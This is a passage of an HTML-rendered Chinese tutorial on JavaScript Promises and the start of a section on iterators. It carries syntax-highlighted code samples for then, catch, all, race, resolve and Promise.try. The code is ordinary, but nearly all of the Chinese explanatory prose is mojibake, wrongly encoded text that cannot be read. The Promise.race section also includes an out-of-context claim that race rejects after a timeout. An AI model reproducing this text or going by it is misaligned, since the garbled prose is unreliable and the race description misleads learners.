title="2ã€åŸºæœ¬ç”¨æ³•"></a>2ã€åŸºæœ¬ç”¨æ³•</h2><p>ä¸‹é¢ä»£ç åˆ›é€ äº†ä¸€ä¸ª<code>Promise</code>å®ä¾‹ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ... some code</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="comment">/* å¼‚æ­¥æ“ä½œæˆåŠŸ */</span>)&#123;</span><br><span class="line">    resolve(value);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    reject(error);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>Promise</code>æ„é€ å‡½æ•°æ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œè¯¥å‡½æ•°çš„ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯<code>resolve</code>å’Œ<code>reject</code>ã€‚</p><p>Promise æ–°å»ºåå°±ä¼šç«‹å³æ‰§è¡Œã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Promise&#x27;</span>);</span><br><span class="line">  resolve();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">promise.then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;resolved.&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Hi!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Promise</span></span><br><span class="line"><span class="comment">// Hi!</span></span><br><span class="line"><span class="comment">// resolved</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼ŒPromise æ–°å»ºåç«‹å³æ‰§è¡Œï¼Œæ‰€ä»¥é¦–å…ˆè¾“å‡ºçš„æ˜¯<code>Promise</code>ã€‚ç„¶åï¼Œ<code>then</code>æ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°ï¼Œå°†åœ¨å½“å‰è„šæœ¬æ‰€æœ‰åŒæ­¥ä»»åŠ¡æ‰§è¡Œå®Œæ‰ä¼šæ‰§è¡Œï¼Œæ‰€ä»¥<code>resolved</code>æœ€åè¾“å‡ºã€‚</p><h2 id="3ã€Promise-prototype-then"><a href="#3ã€Promise-prototype-then" class="headerlink" title="3ã€Promise.prototype.then()"></a>3ã€Promise.prototype.then()</h2><p>Promise å®ä¾‹å…·æœ‰<code>then</code>æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>then</code>æ–¹æ³•æ˜¯å®šä¹‰åœ¨åŸå‹å¯¹è±¡<code>Promise.prototype</code>ä¸Šçš„ã€‚<code>then</code>æ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªæ–°çš„<code>Promise</code>å®ä¾‹ï¼ˆæ³¨æ„ï¼Œä¸æ˜¯åŸæ¥é‚£ä¸ª<code>Promise</code>å®ä¾‹ï¼‰ã€‚å› æ­¤å¯ä»¥é‡‡ç”¨é“¾å¼å†™æ³•ï¼Œå³<code>then</code>æ–¹æ³•åé¢å†è°ƒç”¨å¦ä¸€ä¸ª<code>then</code>æ–¹æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">getJSON(<span class="string">&quot;/post/1.json&quot;</span>).then(</span><br><span class="line">  <span class="function"><span class="params">post</span> =&gt;</span> getJSON(post.commentURL)</span><br><span class="line">).then(</span><br><span class="line">  <span class="function"><span class="params">comments</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&quot;resolved: &quot;</span>, comments),</span><br><span class="line">  <span class="function"><span class="params">err</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&quot;rejected: &quot;</span>, err)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œç¬¬ä¸€ä¸ª<code>then</code>æ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°ï¼Œè¿”å›çš„æ˜¯å¦ä¸€ä¸ª<code>Promise</code>å¯¹è±¡ã€‚è¿™æ—¶ï¼Œç¬¬äºŒä¸ª<code>then</code>æ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°ï¼Œå°±ä¼šç­‰å¾…è¿™ä¸ªæ–°çš„<code>Promise</code>å¯¹è±¡çŠ¶æ€å‘ç”Ÿå˜åŒ–ã€‚å¦‚æœå˜ä¸º<code>resolved</code>ï¼Œå°±è°ƒç”¨ç¬¬ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œå¦‚æœçŠ¶æ€å˜ä¸º<code>rejected</code>ï¼Œå°±è°ƒç”¨ç¬¬äºŒä¸ªå›è°ƒå‡½æ•°ã€‚</p><h2 id="4ã€Promise-prototype-catch"><a href="#4ã€Promise-prototype-catch" class="headerlink" title="4ã€Promise.prototype.catch()"></a>4ã€Promise.prototype.catch()</h2><p><code>Promise.prototype.catch()</code>æ–¹æ³•æ˜¯<code>.then(null, rejection)</code>æˆ–<code>.then(undefined, rejection)</code>çš„åˆ«åï¼Œç”¨äºæŒ‡å®šå‘ç”Ÿé”™è¯¯æ—¶çš„å›è°ƒå‡½æ•°ã€‚</p><p>Promise å¯¹è±¡çš„é”™è¯¯å…·æœ‰â€œå†’æ³¡â€æ€§è´¨ï¼Œä¼šä¸€ç›´å‘åä¼ é€’ï¼Œç›´åˆ°è¢«æ•è·ä¸ºæ­¢ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé”™è¯¯æ€»æ˜¯ä¼šè¢«ä¸‹ä¸€ä¸ª<code>catch</code>è¯­å¥æ•è·ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">getJSON(<span class="string">&#x27;/post/1.json&#x27;</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">post</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> getJSON(post.commentURL);</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">comments</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// some code</span></span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// å¤„ç†å‰é¢ä¸‰ä¸ªPromiseäº§ç”Ÿçš„é”™è¯¯</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œä¸€å…±æœ‰ä¸‰ä¸ª Promise å¯¹è±¡ï¼šä¸€ä¸ªç”±<code>getJSON()</code>äº§ç”Ÿï¼Œä¸¤ä¸ªç”±<code>then()</code>äº§ç”Ÿã€‚å®ƒä»¬ä¹‹ä¸­ä»»ä½•ä¸€ä¸ªæŠ›å‡ºçš„é”™è¯¯ï¼Œéƒ½ä¼šè¢«æœ€åä¸€ä¸ª<code>catch()</code>æ•è·ã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œä¸è¦åœ¨<code>then()</code>æ–¹æ³•é‡Œé¢å®šä¹‰ Reject çŠ¶æ€çš„å›è°ƒå‡½æ•°ï¼ˆå³<code>then</code>çš„ç¬¬äºŒä¸ªå‚æ•°ï¼‰ï¼Œè€Œæ˜¯ä½¿ç”¨<code>catch</code>æ–¹æ³•ã€‚Promise å¯¹è±¡æŠ›å‡ºçš„é”™è¯¯ä¸ä¼šä¼ é€’åˆ°å¤–å±‚ä»£ç ï¼Œå³ä¸ä¼šæœ‰ä»»ä½•ååº”ã€‚é€šä¿—çš„è¯´æ³•å°±æ˜¯â€œPromise ä¼šåƒæ‰é”™è¯¯â€ã€‚</p><h2 id="5ã€Promise-prototype-finally"><a href="#5ã€Promise-prototype-finally" class="headerlink" title="5ã€Promise.prototype.finally()"></a>5ã€Promise.prototype.finally()</h2><p><code>finally()</code>æ–¹æ³•ç”¨äºæŒ‡å®šä¸ç®¡ Promise å¯¹è±¡æœ€åçŠ¶æ€å¦‚ä½•ï¼Œéƒ½ä¼šæ‰§è¡Œçš„æ“ä½œã€‚<code>finally</code>æ–¹æ³•çš„å›è°ƒå‡½æ•°ä¸æ¥å—ä»»ä½•å‚æ•°ï¼Œè¿™æ„å‘³ç€æ²¡æœ‰åŠæ³•çŸ¥é“ï¼Œå‰é¢çš„ Promise çŠ¶æ€åˆ°åº•æ˜¯<code>fulfilled</code>è¿˜æ˜¯<code>rejected</code>ã€‚è¿™è¡¨æ˜ï¼Œ<code>finally</code>æ–¹æ³•é‡Œé¢çš„æ“ä½œï¼Œåº”è¯¥æ˜¯ä¸çŠ¶æ€æ— å…³çš„ï¼Œä¸ä¾èµ–äº Promise çš„æ‰§è¡Œç»“æœã€‚</p><h2 id="6ã€Promise-all"><a href="#6ã€Promise-all" class="headerlink" title="6ã€Promise.all()"></a>6ã€Promise.all()</h2><p><code>Promise.all()</code>æ–¹æ³•ç”¨äºå°†å¤šä¸ª Promise å®ä¾‹ï¼ŒåŒ…è£…æˆä¸€ä¸ªæ–°çš„ Promise å®ä¾‹ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.all([p1, p2, p3]);</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>Promise.all()</code>æ–¹æ³•æ¥å—ä¸€ä¸ªæ•°ç»„ä½œä¸ºå‚æ•°ï¼Œ<code>p1</code>ã€<code>p2</code>ã€<code>p3</code>éƒ½æ˜¯ Promise å®ä¾‹ã€‚å¦å¤–ï¼Œ<code>Promise.all()</code>æ–¹æ³•çš„å‚æ•°å¯ä»¥ä¸æ˜¯æ•°ç»„ï¼Œä½†å¿…é¡»å…·æœ‰ Iterator æ¥å£ï¼Œä¸”è¿”å›çš„æ¯ä¸ªæˆå‘˜éƒ½æ˜¯ Promise å®ä¾‹ã€‚</p><p><code>p</code>çš„çŠ¶æ€ç”±<code>p1</code>ã€<code>p2</code>ã€<code>p3</code>å†³å®šï¼Œåˆ†æˆä¸¤ç§æƒ…å†µã€‚</p><p>ï¼ˆ1ï¼‰åªæœ‰<code>p1</code>ã€<code>p2</code>ã€<code>p3</code>çš„çŠ¶æ€éƒ½å˜æˆ<code>fulfilled</code>ï¼Œ<code>p</code>çš„çŠ¶æ€æ‰ä¼šå˜æˆ<code>fulfilled</code>ï¼Œæ­¤æ—¶<code>p1</code>ã€<code>p2</code>ã€<code>p3</code>çš„è¿”å›å€¼ç»„æˆä¸€ä¸ªæ•°ç»„ï¼Œä¼ é€’ç»™<code>p</code>çš„å›è°ƒå‡½æ•°ã€‚</p><p>ï¼ˆ2ï¼‰åªè¦<code>p1</code>ã€<code>p2</code>ã€<code>p3</code>ä¹‹ä¸­æœ‰ä¸€ä¸ªè¢«<code>rejected</code>ï¼Œ<code>p</code>çš„çŠ¶æ€å°±å˜æˆ<code>rejected</code>ï¼Œæ­¤æ—¶ç¬¬ä¸€ä¸ªè¢«<code>reject</code>çš„å®ä¾‹çš„è¿”å›å€¼ï¼Œä¼šä¼ é€’ç»™<code>p</code>çš„å›è°ƒå‡½æ•°ã€‚</p><p>æ³¨æ„ï¼Œå¦‚æœä½œä¸ºå‚æ•°çš„ Promise å®ä¾‹ï¼Œè‡ªå·±å®šä¹‰äº†<code>catch</code>æ–¹æ³•ï¼Œé‚£ä¹ˆå®ƒä¸€æ—¦è¢«<code>rejected</code>ï¼Œå¹¶ä¸ä¼šè§¦å‘<code>Promise.all()</code>çš„<code>catch</code>æ–¹æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  resolve(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> result)</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> e);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;æŠ¥é”™äº†&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> result)</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> e);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.all([p1, p2])</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> <span class="built_in">console</span>.log(result))</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> <span class="built_in">console</span>.log(e));</span><br><span class="line"><span class="comment">// [&quot;hello&quot;, Error: æŠ¥é”™äº†]</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>p1</code>ä¼š<code>resolved</code>ï¼Œ<code>p2</code>é¦–å…ˆä¼š<code>rejected</code>ï¼Œä½†æ˜¯<code>p2</code>æœ‰è‡ªå·±çš„<code>catch</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªæ–°çš„ Promise å®ä¾‹ï¼Œ<code>p2</code>æŒ‡å‘çš„å®é™…ä¸Šæ˜¯è¿™ä¸ªå®ä¾‹ã€‚è¯¥å®ä¾‹æ‰§è¡Œå®Œ<code>catch</code>æ–¹æ³•åï¼Œä¹Ÿä¼šå˜æˆ<code>resolved</code>ï¼Œå¯¼è‡´<code>Promise.all()</code>æ–¹æ³•å‚æ•°é‡Œé¢çš„ä¸¤ä¸ªå®ä¾‹éƒ½ä¼š<code>resolved</code>ï¼Œå› æ­¤ä¼šè°ƒç”¨<code>then</code>æ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°ï¼Œè€Œä¸ä¼šè°ƒç”¨<code>catch</code>æ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°ã€‚</p><p>å¦‚æœ<code>p2</code>æ²¡æœ‰è‡ªå·±çš„<code>catch</code>æ–¹æ³•ï¼Œå°±ä¼šè°ƒç”¨<code>Promise.all()</code>çš„<code>catch</code>æ–¹æ³•ã€‚</p><h2 id="7ã€Promise-race"><a href="#7ã€Promise-race" class="headerlink" title="7ã€Promise.race()"></a>7ã€Promise.race()</h2><p><code>Promise.race()</code>æ–¹æ³•åŒæ ·æ˜¯å°†å¤šä¸ª Promise å®ä¾‹ï¼ŒåŒ…è£…æˆä¸€ä¸ªæ–°çš„ Promise å®ä¾‹ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.race([p1, p2, p3]);</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œåªè¦<code>p1</code>ã€<code>p2</code>ã€<code>p3</code>ä¹‹ä¸­æœ‰ä¸€ä¸ªå®ä¾‹ç‡å…ˆæ”¹å˜çŠ¶æ€ï¼Œ<code>p</code>çš„çŠ¶æ€å°±è·Ÿç€æ”¹å˜ã€‚é‚£ä¸ªç‡å…ˆæ”¹å˜çš„ Promise å®ä¾‹çš„è¿”å›å€¼ï¼Œå°±ä¼ é€’ç»™<code>p</code>çš„å›è°ƒå‡½æ•°ã€‚å¦‚æœæŒ‡å®šæ—¶é—´å†…æ²¡æœ‰è·å¾—ç»“æœï¼Œå°±å°† Promise çš„çŠ¶æ€å˜ä¸º<code>reject</code>ï¼Œå¦åˆ™å˜ä¸º<code>resolve</code>ã€‚</p><h2 id="8ã€Promise-allSettled"><a href="#8ã€Promise-allSettled" class="headerlink" title="8ã€Promise.allSettled()"></a>8ã€Promise.allSettled()</h2><p><code>Promise.allSettled()</code>æ–¹æ³•æ¥å—ä¸€ç»„ Promise å®ä¾‹ä½œä¸ºå‚æ•°ï¼ŒåŒ…è£…æˆä¸€ä¸ªæ–°çš„ Promise å®ä¾‹ã€‚åªæœ‰ç­‰åˆ°æ‰€æœ‰è¿™äº›å‚æ•°å®ä¾‹éƒ½è¿”å›ç»“æœï¼Œä¸ç®¡æ˜¯<code>fulfilled</code>è¿˜æ˜¯<code>rejected</code>ï¼ŒåŒ…è£…å®ä¾‹æ‰ä¼šç»“æŸã€‚è¯¥æ–¹æ³•ç”± <a href="https://github.com/tc39/proposal-promise-allSettled">ES2020</a> å¼•å…¥ã€‚</p><h2 id="9ã€Promise-any"><a href="#9ã€Promise-any" class="headerlink" title="9ã€Promise.any()"></a>9ã€Promise.any()</h2><p>ES2021 å¼•å…¥äº†<code>Promise.any()</code>æ–¹æ³•ã€‚è¯¥æ–¹æ³•æ¥å—ä¸€ç»„ Promise å®ä¾‹ä½œä¸ºå‚æ•°ï¼ŒåŒ…è£…æˆä¸€ä¸ªæ–°çš„ Promise å®ä¾‹è¿”å›ã€‚åªè¦å‚æ•°å®ä¾‹æœ‰ä¸€ä¸ªå˜æˆ<code>fulfilled</code>çŠ¶æ€ï¼ŒåŒ…è£…å®ä¾‹å°±ä¼šå˜æˆ<code>fulfilled</code>çŠ¶æ€ï¼›å¦‚æœæ‰€æœ‰å‚æ•°å®ä¾‹éƒ½å˜æˆ<code>rejected</code>çŠ¶æ€ï¼ŒåŒ…è£…å®ä¾‹å°±ä¼šå˜æˆ<code>rejected</code>çŠ¶æ€ã€‚</p><h2 id="10ã€Promise-resolve"><a href="#10ã€Promise-resolve" class="headerlink" title="10ã€Promise.resolve()"></a>10ã€Promise.resolve()</h2><p>æœ‰æ—¶éœ€è¦å°†ç°æœ‰å¯¹è±¡è½¬ä¸º Promise å¯¹è±¡ï¼Œ<code>Promise.resolve()</code>æ–¹æ³•å°±èµ·åˆ°è¿™ä¸ªä½œç”¨ã€‚</p><p><code>Promise.resolve()</code>ç­‰ä»·äºä¸‹é¢çš„å†™æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve(<span class="string">&#x27;foo&#x27;</span>)</span><br><span class="line"><span class="comment">// ç­‰ä»·äº</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> resolve(<span class="string">&#x27;foo&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="11ã€Promise-reject"><a href="#11ã€Promise-reject" class="headerlink" title="11ã€Promise.reject()"></a>11ã€Promise.reject()</h2><p><code>Promise.reject(reason)</code>æ–¹æ³•ä¹Ÿä¼šè¿”å›ä¸€ä¸ªæ–°çš„ Promise å®ä¾‹ï¼Œè¯¥å®ä¾‹çš„çŠ¶æ€ä¸º<code>rejected</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.reject(<span class="string">&#x27;å‡ºé”™äº†&#x27;</span>);</span><br><span class="line"><span class="comment">// ç­‰åŒäº</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> reject(<span class="string">&#x27;å‡ºé”™äº†&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="12ã€åº”ç”¨"><a href="#12ã€åº”ç”¨" class="headerlink" title="12ã€åº”ç”¨"></a>12ã€åº”ç”¨</h2><h3 id="åŠ è½½å›¾ç‰‡"><a href="#åŠ è½½å›¾ç‰‡" class="headerlink" title="åŠ è½½å›¾ç‰‡"></a>åŠ è½½å›¾ç‰‡</h3><p>æˆ‘ä»¬å¯ä»¥å°†å›¾ç‰‡çš„åŠ è½½å†™æˆä¸€ä¸ª<code>Promise</code>ï¼Œä¸€æ—¦åŠ è½½å®Œæˆï¼Œ<code>Promise</code>çš„çŠ¶æ€å°±å‘ç”Ÿå˜åŒ–ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> preloadImage = <span class="function"><span class="keyword">function</span> (<span class="params">path</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> image = <span class="keyword">new</span> Image();</span><br><span class="line">    image.onload  = resolve;</span><br><span class="line">    image.onerror = reject;</span><br><span class="line">    image.src = path;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="13ã€Promise-try"><a href="#13ã€Promise-try" class="headerlink" title="13ã€Promise.try()"></a>13ã€Promise.try()</h2><p>å®é™…å¼€å‘ä¸­ï¼Œç»å¸¸é‡åˆ°ä¸€ç§æƒ…å†µï¼šä¸çŸ¥é“æˆ–è€…ä¸æƒ³åŒºåˆ†ï¼Œå‡½æ•°<code>f</code>æ˜¯åŒæ­¥å‡½æ•°è¿˜æ˜¯å¼‚æ­¥æ“ä½œï¼Œä½†æ˜¯æƒ³ç”¨ Promise æ¥å¤„ç†å®ƒã€‚å› ä¸ºè¿™æ ·å°±å¯ä»¥ä¸ç®¡<code>f</code>æ˜¯å¦åŒ…å«å¼‚æ­¥æ“ä½œï¼Œéƒ½ç”¨<code>then</code>æ–¹æ³•æŒ‡å®šä¸‹ä¸€æ­¥æµç¨‹ï¼Œç”¨<code>catch</code>æ–¹æ³•å¤„ç†<code>f</code>æŠ›å‡ºçš„é”™è¯¯ã€‚ä¸€èˆ¬å°±ä¼šé‡‡ç”¨ä¸‹é¢çš„å†™æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve().then(f)</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„å†™æ³•æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œå°±æ˜¯å¦‚æœ<code>f</code>æ˜¯åŒæ­¥å‡½æ•°ï¼Œé‚£ä¹ˆå®ƒä¼šåœ¨æœ¬è½®äº‹ä»¶å¾ªç¯çš„æœ«å°¾æ‰§è¡Œã€‚</p><p>é‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ç§æ–¹æ³•ï¼Œè®©åŒæ­¥å‡½æ•°åŒæ­¥æ‰§è¡Œï¼Œå¼‚æ­¥å‡½æ•°å¼‚æ­¥æ‰§è¡Œï¼Œå¹¶ä¸”è®©å®ƒä»¬å…·æœ‰ç»Ÿä¸€çš„ API å‘¢ï¼Ÿ</p><ul><li><p>ç”¨<code>async</code>å‡½æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;now&#x27;</span>);</span><br><span class="line">(<span class="keyword">async</span> () =&gt; f())().then(...).catch(...);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;next&#x27;</span>);</span><br><span class="line"><span class="comment">// now</span></span><br><span class="line"><span class="comment">// next</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œç¬¬äºŒè¡Œæ˜¯ä¸€ä¸ªç«‹å³æ‰§è¡Œçš„åŒ¿åå‡½æ•°ï¼Œä¼šç«‹å³æ‰§è¡Œé‡Œé¢çš„<code>async</code>å‡½æ•°ï¼Œå› æ­¤å¦‚æœ<code>f</code>æ˜¯åŒæ­¥çš„ï¼Œå°±ä¼šå¾—åˆ°åŒæ­¥çš„ç»“æœï¼›å¦‚æœ<code>f</code>æ˜¯å¼‚æ­¥çš„ï¼Œå°±å¯ä»¥ç”¨<code>then</code>ã€‚</p></li></ul><p><code>Promise.try</code>æ–¹æ³•æ›¿ä»£ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> f = <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;now&#x27;</span>);</span><br><span class="line"><span class="built_in">Promise</span>.try(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;next&#x27;</span>);</span><br><span class="line"><span class="comment">// now</span></span><br><span class="line"><span class="comment">// next</span></span><br></pre></td></tr></table></figure><h1 id="Iterator-å’Œ-forâ€¦of-å¾ªç¯"><a href="#Iterator-å’Œ-forâ€¦of-å¾ªç¯" class="headerlink" title="Iterator å’Œ forâ€¦of å¾ªç¯"></a>Iterator å’Œ forâ€¦of å¾ªç¯</h1><h2 id="1ã€Iteratorï¼ˆéå†å™¨ï¼‰çš„æ¦‚å¿µ"><a href="#1ã€Iteratorï¼ˆéå†å™¨ï¼‰çš„æ¦‚å¿µ" class="headerlink" title="1ã€Iteratorï¼ˆéå†å™¨ï¼‰çš„æ¦‚å¿µ"></a>1ã€Iteratorï¼ˆéå†å™¨ï¼‰çš„æ¦‚å¿µ</h2><p>JavaScript åŸæœ‰çš„è¡¨ç¤ºâ€œé›†åˆâ€çš„æ•°æ®ç»“æ„ï¼Œä¸»è¦æ˜¯æ•°ç»„ï¼ˆ<code>Array</code>ï¼‰å’Œå¯¹è±¡ï¼ˆ<code>Object</code>ï¼‰ï¼ŒES6 åˆæ·»åŠ äº†<code>Map</code>å’Œ<code>Set</code>ã€‚éå†å™¨ï¼ˆIteratorï¼‰æ˜¯ä¸€ç§æ¥å£ï¼Œä¸ºå„ç§ä¸åŒçš„æ•°æ®ç»“æ„æä¾›ç»Ÿä¸€çš„è®¿é—®æœºåˆ¶ã€‚ä»»ä½•æ•°æ®ç»“æ„åªè¦éƒ¨ç½² Iterator æ¥å£ï¼Œå°±å¯ä»¥å®Œæˆéå†æ“ä½œï¼ˆå³ä¾æ¬¡å¤„ç†è¯¥æ•°æ®ç»“æ„çš„æ‰€æœ‰æˆå‘˜ï¼‰ã€‚</p><p>Iterator çš„ä½œç”¨æœ‰ä¸‰ä¸ªï¼š</p><ul><li>ä¸€æ˜¯ä¸ºå„ç§æ•°æ®ç»“æ„ï¼Œæä¾›ä¸€ä¸ªç»Ÿä¸€çš„ã€ç®€ä¾¿çš„è®¿é—®æ¥å£ï¼›</li><li>äºŒæ˜¯ä½¿å¾—æ•°æ®ç»“æ„çš„æˆå‘˜èƒ½å¤ŸæŒ‰æŸç§æ¬¡åºæ’åˆ—ï¼›</li><li>ä¸‰æ˜¯ ES6 åˆ›é€ äº†ä¸€ç§æ–°çš„éå†å‘½ä»¤<code>for...of</code>å¾ªç¯ï¼ŒIterator æ¥å£ä¸»è¦ä¾›<code>for...of</code>æ¶ˆè´¹ã€‚</li></ul><p>Iterator çš„éå†è¿‡ç¨‹æ˜¯è¿™æ ·çš„ã€‚</p><p>ï¼ˆ1ï¼‰åˆ›å»ºä¸€ä¸ªæŒ‡é’ˆå¯¹è±¡ï¼ŒæŒ‡å‘å½“å‰æ•°æ®ç»“æ„çš„èµ·å§‹ä½ç½®ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œéå†å™¨å¯¹è±¡æœ¬è´¨ä¸Šï¼Œå°±æ˜¯ä¸€ä¸ªæŒ‡é’ˆå¯¹è±¡ã€‚</p><p>ï¼ˆ2ï¼‰ç¬¬ä¸€æ¬¡è°ƒç”¨æŒ‡é’ˆå¯¹è±¡çš„<code>next</code>æ–¹æ³•ï¼Œå¯ä»¥å°†æŒ‡é’ˆæŒ‡å‘æ•°æ®ç»“æ„çš„ç¬¬ä¸€ä¸ªæˆå‘˜ã€‚</p><p>ï¼ˆ3ï¼‰ç¬¬äºŒæ¬¡è°ƒç”¨æŒ‡é’ˆå¯¹è±¡çš„<code>next</code>æ–¹æ³•ï¼ŒæŒ‡é’ˆå°±æŒ‡å‘æ•°æ®ç»“æ„çš„ç¬¬äºŒä¸ªæˆå‘˜ã€‚</p><p>ï¼ˆ4ï¼‰ä¸æ–­è°ƒç”¨æŒ‡é’ˆå¯¹è±¡çš„<code>next</code>æ–¹æ³•ï¼Œç›´åˆ°å®ƒæŒ‡å‘æ•°æ®ç»“æ„çš„ç»“æŸä½ç½®ã€‚</p><p>æ¯ä¸€æ¬¡è°ƒç”¨<code>next</code>æ–¹æ³•ï¼Œéƒ½ä¼šè¿”å›æ•°æ®ç»“æ„çš„å½“å‰æˆå‘˜çš„ä¿¡æ¯ã€‚å…·ä½“æ¥è¯´ï¼Œå°±æ˜¯è¿”å›ä¸€ä¸ªåŒ…å«<code>value</code>å’Œ<code>done</code>ä¸¤ä¸ªå±æ€§çš„å¯¹è±¡ã€‚å…¶ä¸­ï¼Œ<code>value</code>å±æ€§æ˜¯å½“å‰æˆå‘˜çš„å€¼ï¼Œ<code>done</code>å±æ€§æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºéå†æ˜¯å¦ç»“æŸã€‚</p><h2 id="2ã€é»˜è®¤-Iterator-æ¥å£"><a href="#2ã€é»˜è®¤-Iterator-æ¥å£" class="headerlink" title="2ã€é»˜è®¤ Iterator æ¥å£"></a>2ã€é»˜è®¤ Iterator æ¥å£</h2><p>Iterator 